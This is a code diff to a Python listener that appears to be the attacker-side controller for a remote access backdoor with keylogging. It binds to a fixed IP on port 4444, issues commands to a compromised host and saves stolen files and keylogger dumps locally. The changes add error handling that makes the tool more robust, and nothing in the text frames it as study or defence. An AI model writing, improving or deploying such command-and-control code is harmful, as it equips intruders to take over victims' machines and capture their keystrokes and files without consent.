@@ -34,9 +34,12 @@ class Listener:
                 continue
 
     def download_file(self, data, path):
-        with open(path, "wb") as file:
-            file.write(base64.b64decode(data.encode()))
+        try:
+            with open(path, "wb") as file:
+                file.write(base64.b64decode(data))
             return "[+] File downloaded successfully!"
+        except Exception as e:
+            return f"[-] Error during file download: {str(e)}"
 
     def upload_file(self, path):
         try:
@@ -62,13 +65,18 @@ class Listener:
             self.send(data)
             result = self.receive()
 
-            if command[0] == "get":
-                self.download_file(result, command[1])
-            elif command[0] == "keyscan_dump":
-                self.download_file(result, "keylog.txt")
+            if command[0] == "get" or command[0] == "keyscan_dump":
+                if result.startswith("[-]"):  # Check if it's an error message
+                    print(result)  # Print the error message
+                else:
+                    try:
+                        file_name = "keylog.txt" if command[0] == "keyscan_dump" else command[1]
+                        download_result = self.download_file(result, file_name)
+                        print(download_result)  # Print the success message
+                    except Exception as e:
+                        print(f"[-] Error during file download: {str(e)}")
             else:
                 print(result)
-
 
 listener = Listener("10.9.234.69", 4444)
 
